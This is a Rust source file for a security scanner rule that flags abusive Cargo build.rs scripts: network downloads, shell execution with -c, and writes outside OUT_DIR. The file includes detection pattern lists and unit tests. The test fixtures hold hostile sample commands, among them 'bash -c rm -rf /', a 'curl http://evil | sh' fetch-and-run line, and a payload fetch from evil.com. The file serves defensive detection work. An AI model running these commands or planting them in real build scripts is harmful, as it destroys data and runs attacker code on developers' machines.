use crate::detectors::Detector;
use crate::scanner::context::ScanContext;
use crate::scanner::finding::*;
use std::collections::HashSet;
use std::ffi::OsStr;

pub struct BuildScriptDetector;

impl Detector for BuildScriptDetector {
    fn id(&self) -> &'static str {
        "DEP-003"
    }
    fn name(&self) -> &'static str {
        "build-script-abuse"
    }
    fn description(&self) -> &'static str {
        "Detects build.rs files with network downloads or arbitrary shell execution"
    }
    fn severity(&self) -> Severity {
        Severity::Critical
    }
    fn confidence(&self) -> Confidence {
        Confidence::Medium
    }
    fn chain(&self) -> Chain {
        Chain::Solana
    } // Listed under Solana but applies cross-chain

    fn detect(&self, ctx: &ScanContext) -> Vec<Finding> {
        // Only trigger for files named exactly `build.rs`. Cargo executes only the
        // crate-root build script named `build.rs` (implicitly or via the `build`
        // key), never ordinary modules such as `src/rebuild.rs` / `src/prebuild.rs`
        // whose path merely ends with the substring "build.rs".
        if ctx.file_path.file_name() != Some(OsStr::new("build.rs")) {
            return Vec::new();
        }

        let mut findings = Vec::new();

        // Strip comments (line + block) while preserving byte offsets and line
        // numbers, so pattern matching cannot fire on commented-out policy text.
        // String literals are preserved because several patterns rely on their
        // contents (e.g. Command::new("curl")).
        let stripped = strip_comments(&ctx.source);

        // Identifiers provably derived from OUT_DIR (canonical cargo codegen pattern).
        let out_dir_tainted = out_dir_tainted_idents(&stripped);

        // Line numbers where a shell interpreter is invoked with `-c` in the same
        // statement (real arbitrary-shell execution).
        let shell_c_lines = shell_arg_c_lines(&stripped);

        // Network access patterns
        let network_patterns: &[&str] = &[
            "reqwest::",
            "curl::",
            "ureq::",
            "hyper::Client",
            "Command::new(\"curl\")",
            "Command::new(\"wget\")",
            ".download(",
            "TcpStream::connect",
        ];

        // Shell execution patterns
        let shell_patterns: &[&str] = &[
            "Command::new(\"sh\")",
            "Command::new(\"bash\")",
            "Command::new(\"cmd\")",
            "Command::new(\"powershell\")",
        ];

        for (idx, (code_line, orig_line)) in
            stripped.lines().zip(ctx.source.lines()).enumerate()
        {
            let line_number = idx + 1;

            if ctx.is_suppressed(line_number, "DEP-003") {
                continue;
            }

            let snippet = orig_line.trim().to_string();

            // Check network access patterns
            for pattern in network_patterns {
                if code_line.contains(pattern) {
                    findings.push(Finding {
                        detector_id: "DEP-003".to_string(),
                        name: "build-script-abuse".to_string(),
                        severity: Severity::Critical,
                        confidence: Confidence::Medium,
                        message: format!(
                            "Build script contains network access pattern: '{}'",
                            pattern
                        ),
                        file: ctx.file_path.clone(),
                        line: line_number,
                        column: 1,
                        snippet: snippet.clone(),
                        recommendation: "Build scripts should not download files from the network or execute arbitrary shell commands. Pin build dependencies and use cargo features instead".to_string(),
                        chain: Chain::Solana,
                    });
                }
            }

            // Check shell execution patterns
            for pattern in shell_patterns {
                if code_line.contains(pattern) {
                    findings.push(Finding {
                        detector_id: "DEP-003".to_string(),
                        name: "build-script-abuse".to_string(),
                        severity: Severity::Critical,
                        confidence: Confidence::Medium,
                        message: format!(
                            "Build script contains shell execution: '{}'",
                            pattern
                        ),
                        file: ctx.file_path.clone(),
                        line: line_number,
                        column: 1,
                        snippet: snippet.clone(),
                        recommendation: "Build scripts should not download files from the network or execute arbitrary shell commands. Pin build dependencies and use cargo features instead".to_string(),
                        chain: Chain::Solana,
                    });
                }
            }

            // Check for a shell interpreter invoked with `-c` (arbitrary shell
            // execution). Only fire when the `.arg("-c")` is in the same statement
            // as a `Command::new("<shell>")`; a bare `.arg("-c")` on gcc/git/tar
            // (compile-only / set-config / create-archive) is not a shell escape.
            if code_line.contains(".arg(\"-c\")") && shell_c_lines.contains(&line_number) {
                findings.push(Finding {
                    detector_id: "DEP-003".to_string(),
                    name: "build-script-abuse".to_string(),
                    severity: Severity::Critical,
                    confidence: Confidence::Medium,
                    message: "Build script uses std::process::Command with shell execution via .arg(\"-c\")".to_string(),
                    file: ctx.file_path.clone(),
                    line: line_number,
                    column: 1,
                    snippet: snippet.clone(),
                    recommendation: "Build scripts should not download files from the network or execute arbitrary shell commands. Pin build dependencies and use cargo features instead".to_string(),
                    chain: Chain::Solana,
                });
            }

            // Check file system writes outside OUT_DIR.
            let has_write = code_line.contains("std::fs::write(");
            let has_create = code_line.contains("std::fs::create_dir(");
            if (has_write || has_create) && !code_line.contains("OUT_DIR") {
                let call = if has_write {
                    "std::fs::write("
                } else {
                    "std::fs::create_dir("
                };
                // Exempt writes whose destination is an identifier provably derived
                // from OUT_DIR (e.g. `let out_dir = env::var("OUT_DIR")...;
                // let dest = out_dir.join(..); fs::write(&dest, ..)`), the canonical
                // cargo codegen pattern. String-literal destinations like
                // "/tmp/evil" have no base identifier and remain flagged.
                let out_dir_derived = fs_first_arg_base_ident(code_line, call)
                    .map(|base| out_dir_tainted.contains(&base))
                    .unwrap_or(false);

                if !out_dir_derived {
                    findings.push(Finding {
                        detector_id: "DEP-003".to_string(),
                        name: "build-script-abuse".to_string(),
                        severity: Severity::Critical,
                        confidence: Confidence::Medium,
                        message: "Build script writes to filesystem outside OUT_DIR".to_string(),
                        file: ctx.file_path.clone(),
                        line: line_number,
                        column: 1,
                        snippet: snippet.clone(),
                        recommendation: "Build scripts should not download files from the network or execute arbitrary shell commands. Pin build dependencies and use cargo features instead".to_string(),
                        chain: Chain::Solana,
                    });
                }
            }
        }

        findings
    }
}

/// Replace comment content with spaces while preserving newlines, byte length,
/// and therefore line/column offsets. String literals (normal and raw) are left
/// intact because several detection patterns depend on their contents.
fn strip_comments(source: &str) -> String {
    let bytes = source.as_bytes();
    let n = bytes.len();
    let mut out: Vec<u8> = Vec::with_capacity(n);
    let mut i = 0;

    while i < n {
        let c = bytes[i];

        // Line comment `// ... \n`
        if c == b'/' && i + 1 < n && bytes[i + 1] == b'/' {
            while i < n && bytes[i] != b'\n' {
                out.push(b' ');
                i += 1;
            }
            continue;
        }

        // Block comment `/* ... */`
        if c == b'/' && i + 1 < n && bytes[i + 1] == b'*' {
            out.push(b' ');
            out.push(b' ');
            i += 2;
            while i < n && !(bytes[i] == b'*' && i + 1 < n && bytes[i + 1] == b'/') {
                out.push(if bytes[i] == b'\n' { b'\n' } else { b' ' });
                i += 1;
            }
            if i < n {
                // consume the closing `*/`
                out.push(b' ');
                out.push(b' ');
                i += 2;
            }
            continue;
        }

        // Raw string `r"..."`, `r#"..."#`, etc.
        if c == b'r' && i + 1 < n && (bytes[i + 1] == b'"' || bytes[i + 1] == b'#') {
            let mut j = i + 1;
            let mut hashes = 0usize;
            while j < n && bytes[j] == b'#' {
                hashes += 1;
                j += 1;
            }
            if j < n && bytes[j] == b'"' {
                // copy opening `r`, hashes, and `"`
                for &b in &bytes[i..=j] {
                    out.push(b);
                }
                i = j + 1;
                loop {
                    if i >= n {
                        break;
                    }
                    if bytes[i] == b'"' {
                        let mut closes = true;
                        for h in 0..hashes {
                            if i + 1 + h >= n || bytes[i + 1 + h] != b'#' {
                                closes = false;
                                break;
                            }
                        }
                        if closes {
                            out.push(b'"');
                            for _ in 0..hashes {
                                out.push(b'#');
                            }
                            i += 1 + hashes;
                            break;
                        }
                    }
                    out.push(bytes[i]);
                    i += 1;
                }
                continue;
            }
            // not actually a raw string; fall through and treat `r` normally
        }

        // Normal string literal `"..."` with escapes.
        if c == b'"' {
            out.push(c);
            i += 1;
            while i < n {
                if bytes[i] == b'\\' {
                    out.push(bytes[i]);
                    if i + 1 < n {
                        out.push(bytes[i + 1]);
                    }
                    i += 2;
                    continue;
                }
                if bytes[i] == b'"' {
                    out.push(b'"');
                    i += 1;
                    break;
                }
                out.push(bytes[i]);
                i += 1;
            }
            continue;
        }

        out.push(c);
        i += 1;
    }

    String::from_utf8(out).unwrap_or_else(|_| source.to_string())
}

/// Returns true if `word` appears in `hay` bounded by non-identifier characters.
fn contains_word(hay: &str, word: &str) -> bool {
    if word.is_empty() {
        return false;
    }
    let bytes = hay.as_bytes();
    let mut start = 0;
    while let Some(rel) = hay[start..].find(word) {
        let idx = start + rel;
        let before_ok = idx == 0 || !is_ident_byte(bytes[idx - 1]);
        let after = idx + word.len();
        let after_ok = after >= bytes.len() || !is_ident_byte(bytes[after]);
        if before_ok && after_ok {
            return true;
        }
        start = idx + 1;
    }
    false
}

fn is_ident_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// Collect the set of local identifiers provably derived from OUT_DIR, tracking
/// transitive `let` bindings (e.g. `let out = env::var("OUT_DIR")...;
/// let dest = out.join(..);`). Iterates to a fixpoint so binding order is
/// irrelevant.
fn out_dir_tainted_idents(stripped: &str) -> HashSet<String> {
    let mut tainted: HashSet<String> = HashSet::new();

    loop {
        let mut changed = false;
        for line in stripped.lines() {
            let t = line.trim_start();
            let rest = match t.strip_prefix("let ") {
                Some(r) => r,
                None => continue,
            };
            let rest = rest.strip_prefix("mut ").unwrap_or(rest);
            let ident: String = rest
                .chars()
                .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
                .collect();
            if ident.is_empty() || tainted.contains(&ident) {
                continue;
            }
            let after = &rest[ident.len()..];
            let eq = match after.find('=') {
                Some(p) => p,
                None => continue,
            };
            let rhs = &after[eq + 1..];
            let derived = contains_word(rhs, "OUT_DIR")
                || tainted.iter().any(|ti| contains_word(rhs, ti));
            if derived {
                tainted.insert(ident);
                changed = true;
            }
        }
        if !changed {
            break;
        }
    }

    tainted
}

/// Extract the base identifier of the first argument of a `call` (e.g.
/// `std::fs::write(`). Returns None when the first argument is not an
/// identifier (e.g. a string literal such as "/tmp/evil").
fn fs_first_arg_base_ident(line: &str, call: &str) -> Option<String> {
    let start = line.find(call)? + call.len();
    let rest = &line[start..];

    let mut depth = 0i32;
    let mut arg = String::new();
    for ch in rest.chars() {
        match ch {
            '(' | '[' => {
                depth += 1;
                arg.push(ch);
            }
            ')' | ']' => {
                if depth == 0 {
                    break;
                }
                depth -= 1;
                arg.push(ch);
            }
            ',' if depth == 0 => break,
            _ => arg.push(ch),
        }
    }

    let arg = arg
        .trim()
        .trim_start_matches('&')
        .trim_start_matches('*')
        .trim_start();
    let base: String = arg
        .chars()
        .take_while(|c| c.is_ascii_alphanumeric() || *c == '_')
        .collect();
    if base.is_empty() {
        None
    } else {
        Some(base)
    }
}

/// Line numbers (1-based) of each `.arg("-c")` whose enclosing statement invokes
/// an actual shell interpreter via `Command::new("<shell>")`. `-c` only means
/// "execute this command string" for shells; on gcc/git/tar it means
/// compile-only / config / create-archive and is not a shell escape.
fn shell_arg_c_lines(stripped: &str) -> HashSet<usize> {
    const SHELLS: &[&str] = &[
        "sh", "bash", "zsh", "dash", "ksh", "fish", "cmd", "powershell", "pwsh",
    ];
    let pat = ".arg(\"-c\")";
    let mut result = HashSet::new();
    let mut search_start = 0;

    while let Some(rel) = stripped[search_start..].find(pat) {
        let pos = search_start + rel;
        // Enclosing statement begins after the previous `;`, `{`, or `}`.
        let stmt_start = stripped[..pos]
            .rfind([';', '{', '}'])
            .map(|x| x + 1)
            .unwrap_or(0);
        let stmt = &stripped[stmt_start..pos];

        let is_shell = SHELLS
            .iter()
            .any(|sh| stmt.contains(&format!("Command::new(\"{}\")", sh)));
        if is_shell {
            let line = stripped[..pos].bytes().filter(|&b| b == b'\n').count() + 1;
            result.insert(line);
        }
        search_start = pos + pat.len();
    }

    result
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run_detector(source: &str) -> Vec<Finding> {
        let ast = syn::parse_file(source).unwrap();
        let ctx = ScanContext::new(
            std::path::PathBuf::from("build.rs"),
            source.to_string(),
            ast,
            Chain::Solana,
            std::collections::HashMap::new(),
        );
        BuildScriptDetector.detect(&ctx)
    }

    fn run_detector_at(path: &str, source: &str) -> Vec<Finding> {
        let ast = syn::parse_file(source).unwrap();
        let ctx = ScanContext::new(
            std::path::PathBuf::from(path),
            source.to_string(),
            ast,
            Chain::Solana,
            std::collections::HashMap::new(),
        );
        BuildScriptDetector.detect(&ctx)
    }

    #[test]
    fn test_detects_curl_command() {
        let source = r#"
use std::process::Command;

fn main() {
    Command::new("curl")
        .arg("https://example.com/payload")
        .arg("-o")
        .arg("output.bin")
        .status()
        .unwrap();
}
"#;
        let findings = run_detector(source);
        assert!(
            !findings.is_empty(),
            "Should detect Command::new(\"curl\") in build.rs"
        );
        assert_eq!(findings[0].detector_id, "DEP-003");
        assert!(findings[0].message.contains("network access"));
    }

    #[test]
    fn test_no_finding_for_safe_build_script() {
        let source = r#"
fn main() {
    println!("cargo:rerun-if-changed=build.rs");
}
"#;
        let findings = run_detector(source);
        assert!(findings.is_empty(), "Should not flag safe build.rs");
    }

    #[test]
    fn test_skips_non_build_rs() {
        let source = r#"
use std::process::Command;

fn main() {
    Command::new("curl").status().unwrap();
}
"#;
        let findings = run_detector_at("src/main.rs", source);
        assert!(findings.is_empty(), "Should not flag non-build.rs files");
    }

    #[test]
    fn test_detects_shell_execution() {
        let source = r#"
use std::process::Command;

fn main() {
    Command::new("bash")
        .arg("-c")
        .arg("rm -rf /")
        .status()
        .unwrap();
}
"#;
        let findings = run_detector(source);
        assert!(
            !findings.is_empty(),
            "Should detect shell execution in build.rs"
        );
    }

    #[test]
    fn test_detects_network_crate() {
        let source = r#"
use reqwest::blocking::get;

fn main() {
    let resp = reqwest::blocking::get("https://evil.com/payload").unwrap();
}
"#;
        let findings = run_detector(source);
        assert!(
            !findings.is_empty(),
            "Should detect reqwest usage in build.rs"
        );
    }

    #[test]
    fn test_detects_fs_write_outside_out_dir() {
        let source = r#"
fn main() {
    std::fs::write("/tmp/evil", b"payload").unwrap();
}
"#;
        let findings = run_detector(source);
        assert!(
            !findings.is_empty(),
            "Should detect fs::write outside OUT_DIR"
        );
    }

    #[test]
    fn test_allows_fs_write_to_out_dir() {
        let source = r#"
fn main() {
    let out = std::env::var("OUT_DIR").unwrap();
    std::fs::write(OUT_DIR.join("generated.rs"), contents).unwrap();
}
"#;
        let findings = run_detector(source);
        let fs_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.message.contains("filesystem"))
            .collect();
        assert!(
            fs_findings.is_empty(),
            "Should not flag fs::write to OUT_DIR"
        );
    }

    // --- Regression tests for eliminated false positives ---

    // FP idx 0: fs::write to an OUT_DIR-derived path *variable* (canonical cargo
    // codegen pattern from the Cargo book). The destination is transitively
    // derived from env::var("OUT_DIR"), so the write is confined to OUT_DIR.
    #[test]
    fn test_no_finding_fs_write_out_dir_variable() {
        let source = r#"
use std::env;
use std::path::PathBuf;

fn main() {
    let out_dir = PathBuf::from(env::var("OUT_DIR").unwrap());
    let dest_path = out_dir.join("generated.rs");
    std::fs::write(&dest_path, "pub const X: u8 = 1;").unwrap();
    println!("cargo:rerun-if-changed=build.rs");
}
"#;
        let findings = run_detector(source);
        assert!(
            findings.is_empty(),
            "Should not flag fs::write to an OUT_DIR-derived variable, got: {:?}",
            findings
        );
    }

    // FP idx 1: `gcc -c` (compile-only) is not shell execution; the whole-file
    // conjunction previously flagged it (and the bare `use` import line).
    #[test]
    fn test_no_finding_gcc_arg_c() {
        let source = r#"
use std::process::Command;

fn main() {
    let out = std::env::var("OUT_DIR").unwrap();
    Command::new("gcc")
        .arg("-c")
        .arg("src/shim.c")
        .arg("-o")
        .arg(format!("{}/shim.o", out))
        .status()
        .unwrap();
}
"#;
        let findings = run_detector(source);
        assert!(
            findings.is_empty(),
            "Should not flag `gcc -c` compile-only invocation, got: {:?}",
            findings
        );
    }

    // FP idx 2: patterns appearing only inside comments must not be flagged.
    #[test]
    fn test_no_finding_patterns_in_comments() {
        let source = r#"
fn main() {
    // Policy: never add reqwest:: or Command::new("curl") to this build script;
    // vendored sources are used instead of any .download( step.
    println!("cargo:rerun-if-changed=vendor/");
}
"#;
        let findings = run_detector(source);
        assert!(
            findings.is_empty(),
            "Should not flag patterns inside comments, got: {:?}",
            findings
        );
    }

    // FP idx 3: an ordinary module whose path merely ends with the substring
    // "build.rs" (e.g. src/rebuild.rs) is not a cargo build script.
    #[test]
    fn test_no_finding_for_rebuild_rs() {
        let source = r#"
pub fn persist_snapshot(path: &std::path::Path, data: &[u8]) -> std::io::Result<()> {
    std::fs::write(path, data)
}
"#;
        let findings = run_detector_at("src/rebuild.rs", source);
        assert!(
            findings.is_empty(),
            "Should not flag ordinary src/rebuild.rs module, got: {:?}",
            findings
        );
    }

    // A real shell interpreter invoked with `-c` (non-sh/bash shell not covered
    // by shell_patterns) must still fire via the tightened .arg("-c") check.
    #[test]
    fn test_detects_zsh_arg_c() {
        let source = r#"
use std::process::Command;

fn main() {
    Command::new("zsh")
        .arg("-c")
        .arg("curl http://evil | sh")
        .status()
        .unwrap();
}
"#;
        let findings = run_detector(source);
        assert!(
            findings.iter().any(|f| f.message.contains(".arg(\"-c\")")),
            "Should detect zsh -c shell execution, got: {:?}",
            findings
        );
    }
}
